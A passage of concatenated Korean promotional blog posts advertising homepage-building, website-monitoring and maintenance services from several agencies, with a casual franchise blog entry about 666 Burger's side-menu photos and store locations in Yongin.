있습니다. 이렇게 함으로써 소비자의 니즈를 좀더 확실하게 파악할수 있습니다. ​뿐만 아니라 SMS알림 기능도 있는데요. 실시간으로 접속된 소비자들이 상담을 요청했을때 그 중요한 타이밍을 놓치지 않게끔 디비쉐어 2.0은 SMS으로 이를 알립니다. 소비자가 궁금증이 생겨서 문의사항을 넣었을때 빠르게 그 사항을 해결해주고 상담해주는것이 고객 만족도에 큰 역할을 합니다. 저또한 문의를 넣었을때 일을 즉각적으로 해결해주는 업체에 더욱 믿음이 가고 또한번 맡겨봐야겠다는 확신이 드는데요. 이렇게 함으로써 고객의 신뢰도는 높아지고 상담을 통해서 소비자의 구매욕구를 굳힐수 있습니다. 이렇게 하면 매출상승의 한 발걸음이 될수 있겠죠?   디비쉐어2.0은 비용적인 부분에서도 부담스럽지 않은데요. 별도로 추가되는 제작비용 없이 초기비용으로 홈페이지를 운영하실수 있습니다. 반응형홈페이지관리 디비쉐어 2.0은 많은 분들이 이용하실수 있게끔 프로그램 이용 난이도도 쉬운편인데요. 몇번 익히시면 능숙하게 잘 활용하실수 있습니다. 초보자도 쉽게 이용할수 있으니 걱정하지 마세요!   영업자 개개인에게 수당 설정 가능 / 사업권 무제한 추가 가능 ​또한 프로그램을 통해서 영업자 개개인에게 수당을 설정할수 있습니다. 한번 프로그램을 이용하시면 사업권을 무제한으로 추가하실수 있습니다. 또한 영업자들에게 개인적으로 마이페이지가 나누어지는데요. 이런 마이페이지를 통해서 실적관리도 가능합니다. 영업자는 관리자를 통해 이 마이페이지에서 다양한 정보를 얻어갈수 있습니다. 예를 들면, 현지 유입내역, 상담내역, 공지사항 등을 사업자는 영업자들에게 한번에 공지를 할수 있습니다. 이렇게 한번에 많은 사람들에게 정보를 제공할수 있으니 시간절약도 가능하고 편리성도 높아지죠? 나중에 사업이 커졌을때에 관리가 어려울수 있지만 이런 프로그램을 이용하시면 체계적으로 일처리가 가능하십니다. 전체적인 홈페이지영업 관리를 통해서 사업이 커져도 부담이 되지 않고 일처리가 지체되지 않습니다. 홈페이지 공지사항 뿐만 아니라 홈페이지를 통해서 SMS로 단체로 공지가 가능합니다. 이런 반응형홈페이지관리 프로그램 기능으로 일처리를 하는데에 있어서 막힘없이 원활하게 일의 순환이 이루어지게됩니다.     직급별 인센티브 지급 관리 또한 영업자, 마케터, 상담원 등 직급별로 인센티브가 다르게 나뉘어지는데요. 이를 진행하는 사업자는 디비쉐어를 통해서 인센티브 지급관리를 할수 있습니다. 이렇게 함으로써 일이 좀 줄어서 편리하겠죠? 사업자는 영업자를 하나하나 신경쓸수 있고 영업자는 사업자에게서 좀더 쉽게 정보를 전달 받을수 있습니다. 이렇게 영업자와 사업자 사이에서 소통의 수단으로써 큰 역할을 합니다. 이렇게 온라인 영업을 처음해보셔서 감이 안오시는 분들은 반응형홈페이지관리 프로그램을 통해서 도움을 받으실수 있습니다.​  영업자 실적 관리또한 사업자는 영업자들의 마이페이지를 통해서 어떠한 일을 진행하고 있고 실적이 어떻게되는지 파악이 가능합니다. 그래서 영업자 개개인에게 피드백을 줄수 있고 별다른 과정없이 현황을 체크할수 있으니 일의 효율성도 높일수 있습니다. 또한 사업권 실적 베스트기능이 있는데요. 어떤 직원이 실적을 얼만큼 내었는지 다른 직원들이 알수있게끔 합니다. 이렇게 함으로써 영업자들도 더 노력하여 좋은 성과를 내기위해 노력하면서 일의 능률과 사기를 높이는데에 큰 도움이 되기도 합니다. 실적베스트가 되기위해서 더 열심히 일을 하게 되는 동기를 부여할수 있습니다. 이렇게 직원 개개인의 능률이 올라가면 일처리가 힘들어서 영업자를 더 고용하지 않아도 되며 이를 통해서 인건비를 줄이는 것도 기대해보실수 있습니다.   이렇게 효율성있게 홈페이지를 관리하며 회사를 운영해 보세요. 회사 혹은 어떠한 기업을 운영하게 될 경우에는 정보관리에 있어서 정확해야하는데요. 특히 판매를 하는경우에는 소비자 관리가 큰 역할을 합니다. 제대로된 소비자 관리만으로도 신뢰도를 높일수있고 고객들의 믿음을 지켜나아갈수 있는데요. 이렇게 디비쉐어를 이용하시면서 다양한 기능을 통해 훨씬더 원활하게 관리에 들어가실수 있습니다. 이렇게 관리를 통하여 부족한 점을 알아채고 그 부분을 채워나가면서 더 나은 사업을 하기위해 한단계 업그레이드 해보세요. ​영업을 하시는 분들께 디비쉐어가 든든한 지원군이 되어줄것 같은데요. 반응형홈페이지관리부터해서 마케팅관리까지 가능하니 홍보걱정은 물론 시스템관리까지 한번에 해결하실수 있습니다. 온라인이 활성화되고 그 기능이 다양해졌는데요. 트렌드에 맞추어나아가며 그 기능을 놓치지않고 이용해보세요. 이렇게 유용한 기능들로 일을 훨씬 효율적으로 진행하실수 있으세요. 이렇게 브랜드의 가치를 높이고 그에 걸맞는 현명한 영업을 꾸려나가보세요. 여러분들에게 똑똑한 솔루션을 제공해드립니다.    ​온라인에서 구매가 많이 이루어지고 있고 소비자들은 온라인을 통해서 구매를 결정하게 됩니다. 많은 사람들이 일상생활에 바빠 휴대폰 또는 인터넷으로 일을 해결하고는 하는데요. 이럴때일수록 저희도 새로운 방법으로 소비자들의 요구에 맞추어 빠르게 대처해나아가는게 중요하겠죠?    디비쉐어 2.0에 관심이 있으신 분들은 고민하지 말고 상담을 진행해보세요. 현재 영업을 하고 있는데에 불편함이 있으신 분들은 이런 프로그램을 통해서 불편함을 해소하실수 있고 더 발전할수 있는 계기가 될수도 있습니다. 디시붸어는 카카오톡 플러스 친구를 통해서도 상담이 가능하답니다. 간단한 상담도 가능하시니 상담을 한번 진행해보세요!             ​ 홈페이지모니터링 꼼꼼하게 관리하자​안녕하세요. 모니터링을 비롯한 CS/QA/마케팅 등 다양한 서비스를 제공해드리는 홈페이지모니터링업체 에드업입니다 ^^​ ​장기화되는 코로나19 사태로 인해 사람들은 집에서 머무는 시간이 길어지고 온라인서비스를 적극 활용하고 있는데요.​굳이 나가지 않고 집안에서 스마트폰이나 PC하나로 간편하게 해결할 수 있기때문에 온라인 환경은 더더욱 커져가고 있는것 같습니다.​ ​사람들은 포털 검색창에 필요한 것들을 검색하고 그에 해당하는 홈페이지에 들어가는 행위를 할탠데 만약 그 홈페이지가 접속이 잘 되어지지 않는다면 굉장히 불편함과 에러사항을 겪지 않을까 싶은데요.​ 특히나 기업을 운영하는 입장에서 만약 자사의 서버가 불안정하여 홈페이지를 고객들이 접속할 수 없을 때 다른 경쟁사로 고객들이 유입된다거나 많은 불편 및 불만사항을 나타내기때문에 홈페이지모니터링 관리가 필요하다고 보고 있습니다.​ ​하지만 홈페이지모니터링을 하기에는 24시간 연중무휴 관리가 필요한데 내부에서 관리할 경우 직원들이 퇴근을 하거나 휴일인 날에는 모니터링을 해줄 인원이 없기때문에 전문적으로 관리해줄 외부업체에 맡겨보시는 것도 좋은 방안이 되실겁니다.​ ​홈페이지모니터링 전문업체 에드업은 24시간 실시간으로 사이트를 확인하며 보안 및 위협정보를 수집˙분석하여 리포트를 실시간적으로 전달해드리고 있으니 관리자께서는 조치를 즉각적으로 하실 수 있습니다.​또한 필요에 따라 선조치로 대응도 하고 있으니 긴급한 장애상황 발생 시에도 유연하게 대처해드리고 있습니다.​ ​홈페이지모니터링 전문업체 에드업은 홈페이지 상태 뿐만 아니라 서버 정보를 분석 및 통계자료를 만들어 리포트 제공을 해드리고 있으며 이외에도 실시간 마켓 리뷰 대응도 가능하죠. 구글/앱스토어/원스토어 등에 달리는 리뷰들을 확인하고 응대를 진행해드리고 있습니다.​ ​모니터링은 꼭 필요한 업무입니다. 성능 문제를 해결하고 개선시킴으로서 이용자들이 불편하지 않도록 케어해드리는 것인데요. 만약 이를 즉각적으로 대응하지 못할 시 기업의 이미지 손실 및 타격에 큰 영향을 미칠 수 있는만큼 가볍게 여기지 마시고 이용자들이 편리하게 이용할 수 있도록 해야합니다.​ ​그리고 무엇보다도 메리트가 있는 부분은 저비용 고효율이라는 것인데요. 내부에서 진행시에 필요한 모니터링 체계 구정 및 전문인력 채용에 드는 비용을 절감하실 수 있으며 이슈발생 시 선조치 후보고 시스템을 통한 처리로서 운영에 안정감을 부여해드리고 있습니다. ​그리고 리포트 작성 및 보고를 통해 문제점 파악과 개선방향을 잡기 쉬워질 수 있습니다. 서비스를 운영한다면 필수적인 모니터링, 이제 에드업을 만나 꼼꼼하게 관리해보세요~​​대표문의: 070-7009-6118​​​​ ​​​ 에드업광주광역시 동구 금남로 245 전일빌딩 7층 701호 에드업 ​ 안녕하세요 학원홈페이지 제작 학원사랑넷입니다.^^​학원을 운영하면서 스마트한 시대에홈페이지 운영은 대부분 기본으로 운영중에 계시다보니학원을 개원할 경우 제일 먼저 온라인 마케팅을 위한홈페이지제작과 네이버 검색어 노출에 대한 노력을 하십니다​효과적인 홈페이지 제작과 합리적인 운영을 통해편리한 관리까지 가능한학원사랑넷을 통한 제작과 관리에 대해서 안내드리겠습니다.  ​​​ 학원사랑넷은 홈페이지 제작을 20년 이상 진행하고 있는 기업입니다.잠깐 생겨나 없어지는 것이 아닌20년 이상 롱런 하고 있어 믿고 맡길 수 있습니다.:D​20년 이상 롱런하며 함께 달려오고있는 10년이상의 경력을 가진 디자이너들이 퀄리티 있는좋은 디자인 컨텐츠를 준비하기에​높은 만족도를 통한 홈페이지 제작을 할 수 있습니다 20년 이상 학원 홈페이지 제작을 진행하면서더욱 효과적이며 합리적인 제작과정을 통해33만원의 거품을 쫙~! 뺀 합리적인 제작비용과월 22,000원의 저렴한 사용료로 서비스를 하고 있습니다  학원 운영에 좀 더 여유 있을 수 있도록학원사랑넷이 지원합니다.^^  요즘 학원홈페이지제작의 목적은 어디서든 자유롭게 홈페이지를 볼 수 있는 마케팅 활동을 위한 수단입니다.PC + 태블릿 + 스마트폰 어디서든 사용이 가능해야한다는 것이 주요 포인트입니다.​학원사랑넷은어디서든 자유롭게 홈페이지를 사용할 수 있는반응형 홈페이지로 제작을 하고 있으니안심하고 제작하셔도 됩니다.   ​  홈페이지를 제작만하고 관리는 안하실건가요?관리는 하고 싶은데 관리가 너무 어려우시다고요??  학원사랑넷은직접 수정이 가능할 수 있도록홈페이지 수정 시스템과 팝업 제작 시스템을 통해자유롭게 쉽고 편하게 홈페이지 관리가 가능합니다​잘 모르는 기능도 도움말 기능을 통해바로 확인이 가능하니쉽게 관리가 가능한 학원사랑넷입니다. 학원홈페이지제작 후 운영시에 홈페이지를 활성화 시키기위한다양한 활동을 할 수 있습니다.그중에 온라인 강의 서비스를 계획하기도 하는데요​학원사랑넷은 온라인 강의 시스템 서비스가 있어서비대면이 강화되는 현 트렌드도 문제 없이 대비 할 수 있습니다.  ​학원홈페이지제작시 학원사랑넷을 통한 제작....이래도 안하실건가요?​상담을 통해 좀 더 자세한 문의가 가능합니다.^__^ 학원사랑넷학원 홈페이지 제작, 스마트폰 홈페이지, 쉽고 편한 관리 시스템www.hakwon-love.net ​ ​안녕하세요!홈페이지제작 전문 에이전시, 핏소프트입니다.​홈페이지는 제작도 중요하지만 어떻게 관리하고업그레이드 하는지에 따라서도 그 가치가달라진다는 사실, 모두 알고 있으실 것입니다.​홈페이지를 방치하는 것이 아니라면 유지보수는언젠가 무조건 하게 되어 있는데 이때 처음 제작을의뢰한 곳이 사라졌거나 업체의 기술력이 부족해서원하는 유지보수를 진행하지 못한다면 정말 난감하겠죠?​ 홈페이지개발~유지보수까지 한번에!그래서 홈페이지개발부터 관리까지 원스톱으로 안심하고맡길 수 있는 에이전시를 찾는 것이 중요한데저희 핏소프트는 전문 홈페이지개발사로 유지보수까지믿고 의뢰할 수 있어서 만족스럽습니다!​ ​제작 상담부터 기획, 제작, 운영에 걸쳐 각 업무를담당하는 전문 인력이 체계적으로 작업을 진행하고1:1로 세심한 관리 서비스를 제공하는 전담 매니저가배치되기 때문에 결과물에 대한 완성도가 높습니다.​제작 이후에도 전담 매니저와 꾸준한 커뮤니케이션이가능해서 발 빠른 유지보수를 통한 홈페이지관리도 할 수 있죠.​ ​저희 핏소프트는 우수한 기술력으로 관리자 역시원하는 대로 커스텀해서 사용할 수 있어 고객님들의홈페이지개발에 대한 만족도가 높은 편입니다.​사용하지 않는 메뉴는 과감하게 없애서 복잡한 관리방법을 벗어날 수 있고 필요한 기능만 사용해누구든 빠르고 간편하게 관리자 페이지를 활용할 수 있습니다.​ ​홈페이지개발 견적도 템플릿형과 맞춤형 2가지 방법 중에적합한 상품을 선택할 수 있는데요! 템플릿형 상품은핏소프트가 자체 제작한 템플릿과 서버를 이용해서원가를 낮췄기 때문에 가성비가 좋아 비용 대비만족스러운 서비스 품질을 받으실 수 있습니다.​후회하지 않는 홈페이지개발 업체를 찾으신다면,믿고 맡길 수 있는 홈페이지관리 방법을 컨설팅 받고싶으시다면 저희 핏소프트로 문의 주셔서자세한 내용을 상담 받으시길 바랍니다 :D​ ​ 안녕하세요 비전테크입니다~오늘은 홈페이지 관리 저렴하게 하는 꿀팁을 가져와봤습니다!​이제는 대부분의 사람들이 정보를 찾기 위해서 인터넷을 활용하기 때문에업체, 가게 등의 정보를 홍보할 수 있는 가장 기본이 바로 홈페이지죠.하지만 홈페이지는 초보자 분이 직접 운영하는데에 큰 어려움이 많습니다.제작뿐만 아니라 유지관리하는 것도 전문가의 기술력이 필요한 부분이 많은데요.그래서 대행 업체를 찾아서 제작을 의뢰하시는 분들이 많습니다!오히려 시간적으로 비용적으로도 절감되는 부분이 많기 때문인데요.​ 홈페이지 제작부터 유지관리까지 하기 위해서 여러 업체를 찾아보면 가격이 천차만별입니다.무조건 가격이 비싼 고퀄리티의 홈페이지를 생산해내는 것도저렴한 곳이 저품질의 홈페이지를 생산하는 것도 아닙니다.​업체마다 제공하는 서비스, 그리고 업체의 규모, 기술력 등에 따라 가격이 달라지는데요.상담을 통해서 어떤 서비스를 제공하는지, 이전에 작업을 진행한 경력이 있는 분들이 함께하는지 다방면에서 고려해보고 결정하시는 게 좋습니다.그래도 계속해서 가성비 좋은 업체를 알아보기 위해서 여러 곳에서 상담을 받고견적서 받는 과정을 반복하실 거라고 생각합니다.​ 비전테크에서는 1년 도메인, 웹호스팅 비용을 포함해 드리고 있으며고해상도의 이미지를 활용하고 있어서 홈페이지 제작 시 고품질의 디자인으로 제작이 가능합니다!이 외에도 여러 가지 서비스를 합리적인 가격에 제공해드리고 있는데요.제공해드리는 서비스들은 비전테크 홈페이지에 접속해서 보실 수도 있고요.상담을 통해서도 자세하게 말씀드리겠습니다! 비전테크System Integration e-Biz Consulting IT Outsourcing System Integration 기업, 영업, 유통 관리부터 학교, 동아리, 밴드 소모임까지 다양한 환경에 맞춘 제작 및 관리 솔루션을 제시합니다. ▶ 기업, 유통, 영업 활동 관리 솔루션 ▶ 학교 동아리, 밴드 등 커뮤니티 관리 솔루션 ▶ 기업, 종교시설 홈페이지 관리 솔루션 ▶ 동영상 제작 및 관리 솔루션 System Integration ICT Service Provider 시스템 통합 구축 서비스, IT 아웃소싱 서비스, SW 테스팅...www.vision-tech.co.kr 비전테크 카카오톡 채널 : http://pf.kakao.com/_twHJK​ ​비전테크에서는 여러가지의 서비스를 제공해드리는 것 뿐만 아니라홈페이지 전문 경력자분들이 작업을 해드리고 있습니다.타 업체의 경우 일을 배우기 시작하시는 분이 전담으로 맡아서 하거나학생에게 맡겨서 하는 경우가 있어서 '작업 중간에 문제가 생기는 경우가 많았다',혹은 '결과에 큰 만족을 하지 못했다'는 말씀도 많이 하시는데요.​ 저희 비전테크에서는 계속해서 마케팅을 해왔던 전문가분들이 함께 진행해 드리고 있기 때문에만족스럽지 못한 부분을 실시간 피드백을 통해 수정 작업이 가능하고훨씬 더 고퀄리티의 홈페이지 운영이 가능하다고 자부할 수 있습니다!​ 비전테크에서는 세련된 디자인 작업과 빠른 피드백을 통한 유지관리도 가능할 뿐만 아니라홈페이지 홍보까지 원하시는 분들에게는 홍보작업까지 진행이 가능한데요.이제 시작하는 스타트업이라면 더더욱 홍보는 필수겠죠.기업마다 홍보부서를 따로 둘 만큼 SNS를 통한 홍보는 계속해서 중요해지고 있습니다.홍보에 어느정도 중점을 두냐에 따라서 매출증가에도 큰 영향을 끼치고 있는데요.​비전테크에서는 이렇게 홈페이지 제작부터 유지관리, 홍보까지합리적인 가격에 제공이 가능합니다!​이외에도 홈페이지 관련해서 궁금하신 점이 있으시면 상담 남겨주세요! 간편한 카카오톡 상담을 통해서 궁금 하시점 남겨주시면 더욱 자세한 상담이 가능합니다.비전테크 카카오톡 채널 : http://pf.kakao.com/_twHJK ​   ​ 프리미엄 수제버거 브랜드 666버거 에는 여럿 점포가 있지만,용인시 처인구 에도, 666버거 처인구점이 있습니다.​https://blog.naver.com/livresse92/222337713877 <🍔666버거🍔의 신규 매장 소개 시리즈4> 666버거 처인구점안녕하세요 여러분 5월은 무슨날? 우리들~ 세~상~ 5월은 어린이날! 우~리들 세상~ 아니겠습니까!! 다들 수...blog.naver.com 아니 그런데 아까ㅋㅋㅋㅋㅋ 문자 캡쳐한 화면 안전 문자에서ㅋㅋㅋㅋㅋ아니 이거 웃을 일이 아닌건가...?​곰 탈출 발생....?​곰..?​탈출...?​근데 곰이 어디서 탈출했는지는 안알려주네요.곰이 탈출했다는 건, 동물원에서 탈출했다는 건지...보통 산에서 곰이 발견된 걸로 곰탈출이라고는 안할 것 같은데....​어쨌건 큰 곰은 굉장히 위협적이고 사나운것 뿐만아니라 사람을 공격할 수 있어서크게 다칠 수 있다고 알고 있어서걱정이 되는군요.​우리 용인시 처인구에 들르게 된다면,666버거 처인구점도 가보곰, 꿀맛 수제버거도 먹어보곰,곰도 피해보곰맨날 이상한 소리 해대서 죄송하곰...​666버거는 모든 메뉴가 다 꿀맛인데...대체어떤 메뉴를 먹으면 좋을지 곰곰이 생각해보곰....​ 이대리 오늘의 추천버거는 더 머쉬룸 버거 먹어보곰?​​하지만 666버거 처인구점만 용인시에 있는 것은 아니지요!​용인시 기흥구에는 666버거 기흥점도 있습니다.​https://blog.naver.com/livresse92/222325506851 <🍔666버거🍔의 신규 매장 소개 시리즈3> 666버거 기흥점안녕하세요, 수제버거 전문 프랜차이즈 666버거의 이 대리입니다. 오늘은 여러분의 마음의 양식을 쌓고 역...blog.naver.com ​그리고 용인시 기흥구에는666버거 기흥점만 있는 것이 아니라,​이 이대리가 근무하는 666버거 체인본부 가 위치하여 있습니다.​ #이대리일기​ 이대리와 그의 부하 버거군​여러분, 혹시 666버거의 공식 홈페이지에 들러 살펴보신 적이 있으신가요?​http://www.666burger.co.kr/content/side 666버거666버거,수제버거,프랜차이즈,햄버거 창업,수제햄버거,레스토랑 창업,음식점,버거www.666burger.co.kr 위 링크로 들어가보시면, 666버거 사이드메뉴 감자튀김요로코롬 666버거의 사이드메뉴가 사진으로 소개되어있는데요,​한동안 홈페이지에는,​ 666버거 공식 홈페이지 초기 사이드메뉴 카테고리의 모습요렇게 감자튀김 이미지 밖에 없었어요!​그래서 666버거에 그렇게나 맛있는 사이드메뉴가 많은데몰랐었다는 이야기를 많이 듣게 되고 이대리의 마음이 많이 안좋았어요.​그래서 제가 얼마나 열심히 작업했는지,핡핡​스튜디오에도 단 한번 안가고,요로코롬 아래처럼 666버거 사이드메뉴 닭다리 치킨공식 이미지를 만들기 위해서제가 얼마나 열심히 작업했었는지..!!​​ 666버거 사이드메뉴 츄러스이게 다 제가 회사를 위해서 제 월급 빼고 0원 들여서 작업한거라니까요!!역시 전 포토샵을 잘한단말이에요.(이래뵈어도 자격증까지 소지중이라구요 우훗 써먹을 때가 자랑할 데 밖에 없는 자격증..;)​10원도 아니고,1원도 아니고,단돈 0원을 들였는데...(회사여, 찬양하라 이대리~!!)​훗 이젠 아니란말씀!거액을 주고!!!!스튜디오에 가서!!!사이드메뉴 사진까지도 찍어왔단말입니다!!!​어 그럼 요번엔 이대리 아무일도 안한거네?라고 하실 수 있겠지만천만의 말씀!​ 666버거의 사이드메뉴 치즈볼요렇게 스튜디오에서 멋지게 찍어준 사진을,​ 666버거 치즈볼.png이렇게 배경이 투명한 png 파일로 바꾸는 과정은굉장히 귀찮 손이 많이 간답니다!(우리가 흔히 전문용어로 "누끼"라고 하죠. 일본어의 '빼다' 라는 말에서 온거 같은데...)전부 이대리 혼자서 다 작업했다는...흙..아니 우는 소리 아니고 흙이요.흙. soil.이 흙에서 새 생명이 자라나고 또 죽은 생명들이 떠나간다는 게 이 얼마나 경의로운...뭐래는 거죠...​아하하​​ 그래서 홈페이지가 요렇게 더 고급진 사진으로 바뀔거라구요!!​그리고 사진속에 보이는,맨 오른쪽 하단에 "톡문의" 보이시나요?​여기로 카톡주시면,무려 이 이대리랑 1:1 오픈톡 채팅이 가능하단 사실~!기다리고 있어여 >_< 여러분의 진실된 가맹문의!이렇게 좋은 조건으로 프랜차이즈 창업하기가 쉽지 않아요.계다가 아직 이벤트 진행중이니까, 서두르시면 더 파격적인 조건에..!!그러니까이대리의 666버거로 하나되는 동료가 되지 않으시겠어요? ​아아앗 그러면 저는 아직도 할일이 많이 쌓여있어서그만 오늘의 일기는 여기까지~~!!​ 666버거 체인본부경기도 용인시 기흥구 중부대로 184 ​ 광주홈페이지제작 관리 한번에 해결​안녕하세요(주)빌리언즈 10억홈피입니다!​요즘 온라인 시장이활성화되면서 하루에도수많은 웹사이트들이생겨나고 사라지고 있다고해요~​그래서 오늘은기업이나 브랜드의첫 인상을 결정해줄광주홈페이지제작에대한 이야기를 해볼까합니다!​ ​광주홈페이지제작이후에도 관리가 중요한건생각보다 많은 웹사이트가몇년전 모습 그대로방치되어있기 때문입니다!​고객의 입장에서 봤을때업데이트가 전혀 없고누가봐도 옛날 디자인이라면다시 찾아올 마음이 생길까요?​ ​혹시광주홈페이지제작이후 홈페이지를 담당할인력이 따로 있으시나요?​ ​없다면 이후 홈페이지 관리까지 맡아줄 수 있는 곳으로선정하셔야해요~그래야 꾸준한 업데이트와안정적인 관리가 가능해집니다!​ ​웹사이트는 고객이방문했을때기업이나 브랜드의첫인상을 결정짓게 됩니다!​하지만 첫인상이 나쁘면그게 오래가듯,오래된 홈페이지는 고객 이탈의 원인이될 수 밖에 없어요~​ ​그래서 따로 관리해줄 인력이 없다면제작 이후 부터유지보수 서비스를맡기시는 게 가장 좋은방법입니다!​고객들에게 전해야하는새로운 정보나 디자인 업데이트 등 지속적으로관리해준다면 잘 활성화되고있는 웹사이트라는 이미지를심어줄 수 있어요!​ ​홈페이지 관리는생각보다 여러 분야로나눠지게 됩니다!​공지사항이 있다거나새로운 콘텐츠를 업데이트하는 것 뿐만 아니라팝업 제작, 등록 등 디자인적인관리가 필요한 부분도 있어요!​홈페이지 오류나기능 개선또한 마찬가지입니다!​  ​실시간으로 요청된유지보수 서비스 내용이에요~​전문가가 아닌 이상홈페이지는 관리하기쉽지 않은 부분들이 있기마련입니다!​급하게  전해야할 정보가 있거나쇼핑몰의 경우에는갑자기 기능에 문제가생기면 당황스러울 수 밖에없어요~ 매출과 직결되는부분이기도 하기 때문입니다!​ ​그렇다면유지보수 서비스는 어떤종류가 있을까요?​홈페이지 유지보수는건별과 약정 유지보수로나눠 볼 수 있습니다!​ ​우선 건별 유지보수는원하시는 서비스 하나씩건별로 견적을 보내드리는방식입니다!​평소에 홈페이지 수정할일이 거의 없으시다면상관없으시겠지만 쇼핑몰이나공공기관 등 업데이트할내용이 많은 곳은 건별유지보수가 더 많은견적이 발생하실 수 있어요!​ ​그래서 1년 단위로약정 유지보수 서비스를많이 이용하시는 편입니다!​호스팅, 도메인을 무료 연장해드리면서1년 단위로 전반적인홈페이지 관리를해드리고 있어요!​ ​1500건 이상의 홈페이지를제작해온 경험을 바탕으로웹사이트 구축부터 관리까지편하게 맡겨보세요~​ ​제작 이후1년 무상 유지보수서비스 뿐만 아니라. 1:1 담당자전담제로 신속하게웹사이트 문제를해결해줄 수 있는 곳으로선택해보세요~​ Previous imageNext image ​더 많은 웹사이트 구축사례는 아래 홈페이지를통해 확인하실 수 있습니다!​ ​매달 나가는 고정인력에대한 인건비 걱정 없이전문인력을 효율적으로활용하실 수 있어요!​ ​검색을 통해 기업이나브랜드를 먼저 평가하는 지금, 고객에게 신뢰감을 주는웹사이트를 통해 비즈니스성장의 발판을 마련해보세요!​광주홈페이지제작 관리 무료견적↓​  ​ (주)빌리언즈광주 홈페이지, 쇼핑몰 제작 기업. 반응형웹, 홈페이지 제작, 유지관리, 쇼핑몰 제작, 온라인마케팅billions.wcms.kr ​ 10억홈피광주광역시 북구 첨단과기로176번길 27 광주디자인진흥원 5층 510호 요즘은 오프라인 시장이 많은 어려움을 겪게 되면서새로운 시장의 활기를 찾기 위하여 온라인 시장으로눈을 돌리는 업체가 많이 있습니다.​이는 시장의 기본 원리에 의하여 당연한 결과물이며사람들의 시선이 모이는 곳으로 업체들이 모이는결과인 것입니다.​온라인 시장으로 접근하는 방법도 다양합니다.사업자의 홈페이지에서부터 블로그를 통해 소비자들의 관심을 이끌어내기도 하고, 소셜 네트워킹서비스를 통한 소통으로 접근하는방법 등이 이에 해당합니다.​ 그중에서도 홈페이지는 개인이나 단체, 기업이나사업들이 홍보나 정보를 온라인으로 제공하는기본적인 방법이며, 이를 통한 홍보 효과에 대한 관심도 많이 쏠리고 있는 것이 사실입니다.​이러한 상황에 맞추어 개인 업체를 운영하는 분들 중많은 분들이 홈페이지를 개설하고 이를 운영하고 계십니다.​그러나 개인 업체를 운영하시는 분의 연령대가다양하고, 그중 젊은 분들은 또 다를 수 있지만나이가 있으신 분들에 경우 홈페이지 자체에 대해잘 알지 못해 개설 단계부터 관리와 운영까지전반적인 부분에 어려움을 호소하시는 분들이많이 있습니다.​ 이러한 업주들의 소비에 맞추어 홈페이지관리업체들이 생겨나고 있습니다.​홈페이지 관리는 해당 업주 홈페이지에 꾸준한 고객이 유입될 수 있도록 하는 것이 목표이며이를 위해서는 꾸준한 활동으로 잘 운영되고 있다는 것을 보여 고객으로 하여금 신뢰를 쌓는 것이 주요합니다.​잘 운영이 되고 있다는 것은 먼저 꾸준히 유지 보수가 이루어져야 한다는 것을 의미합니다.​ 단순하게 사진 몇 장 글 몇 개를 홈페이지에 올려놓아 내용을 부실하게 구성한 뒤 몇 개월이 지나도 업그레이드되는 것 없이 그 상태 그대로를유지한다면 새로운 고객의 유입이 힘들 뿐 아니라한번 들러본 고객이라도 다시는 들어오지 않을 것입니다. ​이는 오프라인에서 봤을 때 매장을 차려놓고간판부터 내부 물건들까지 부서지거나 닳은 부분을하나도 수리하지 않고 내버려 두는 것과 같습니다.​그러나 한 개인이 새로운 이미지를 찾아 그에맞는 텍스트를 작성하여 페이지를 새로 제작하거나팝업 창을 만들고 하는 것은 쉬운 것이 아닙니다.​홈페이지관리업체는 전문적인 인력이 배치되어 있어이러한 부분을 업주분들과 콘텍트 하여 원하는 방향으로 수정과 유지를 해드리는 것입니다.​ 그러나 모든 홈페이지관리업체가 수정과 유지를 잘 관리해 주는 것은 아닙니다.​금전적인 비용을 꾸준히 지불함에도 불구하고전문인이 아니라 외주를 주어서 하는 경우는여러 단계를 거치기 때문에 처음에 의도한 방향으로수정이 이루어지지 않는 경우들이 빈번하게발생합니다.​또한 전화나 메일, 메신저로 수정 사항을 요청하여도즉각적인 반응으로 대처하지 않고, 며칠씩 요청에불응하며 대응에 느려 불편함을 주는 업체도많이 있습니다.​그렇기 때문에 그런 업체와 계약을 하지 않도록신중하게 업체를 선정할 필요가 있습니다.​ 업체를 선정하실 때 금전적인 부분도 잘 비교를해보셔야 합니다.​연간으로 봐주는지, 월별로 봐주는지에 대한금액 적용 기간은 업체마다 다양하게 이루어질 수있으며, 보수 횟수 별로 금액을 지불하는 경우도있습니다. ​가격을 비교해 보실 때, 특정 기간이면 그 기간 동안페이지 제작, 이미지 수정, 텍스트 수정, 팝업이나배너 제작을 몇 번 해주는지, 그에 따른 가격은어찌되는 지를 비교해서 보신다면 효율적일 수 있습니다.​또한 각 보수 건별로도 해주는 업체인지도 체크를하시고, 그 금액도 꼼꼼히 비교해 보는 것이 좋습니다.간혹 금액을 높게 받기 위해 건별로 관리를 해주지않는 업체도 존재하기 때문입니다.​ 홈페이지 관리가 내부적인 보수와 유지도 중요하지만, 어떻게 해당 홈페이지로 사람들의유입을 이끌어낼 수 있는지도 매우 중요합니다.​아무리 수시로 내용을 업그레이드하고 철저하게관리를 하더라도 사람들이 방문을 하지 않는다면홍보가 되지 않아 금전적인 손해만 보게 되는것이기 때문입니다.​ 그렇기 때문에 전문 인력을 통한 적절한마케팅 솔루션 또한 홈페이지관리업체에서 진행하는중요한 사업입니다.​키워드광고를 진행하는 업체들이 있는데 이를이용하면 온라인에서 좋은 마케팅이 될 수 있습니다.​검색 사이트에서 특정 키워드를 검색했을 때, 검색 결과 화면에 해당 업체의 홈페이지 사이트가상단에 노출되도록 하는 광고로키워드를 무엇으로 하느냐에 따라 그 성과가엄청난 차이를 불러올 수 있습니다.​ 키워드를 선정할 때 사람들이 많이 검색하는단어로 선정하는 것이 무조건 유리할 수 있는 것인데, 이를 무엇으로 선정할지를 업체의 도움으로컨설팅 받게 되는 것입니다.​해당 업체에서 전문적인 인력이 구축되어 있다면키워드 제안과 제목 설명하는 문구 작성에 있어서통계를 베이스로 한 진행이 가능하게 되어실제 효과를 성공적으로 이끌 확률을 높이게되는 것입니다.​그러나 이러한 전문성이 업체의 노하우가 되는 것이며 이는 다년간 경험과 데이터를 가지고있을 때만이 가능합니다.​ 저희 홈페이지관리업체 웨일즈소프트는 보수 유지관련하여 게시판 및 메신저로 문의를 주시면해당 담당자를 정하여 빠르게 피드백 관리를 하고 있으며, 마케팅 솔루션 또한 전문 인력을 갖추어 적재적소에 맞게 컨설팅을 진행하고 있습니다.​또한 키워드 광고 진행에 있어서 오랜 노하우와분석 자료를 기반으로 키워드 광고 전략을 제시하고있으며 시장조사와 광고 집행의 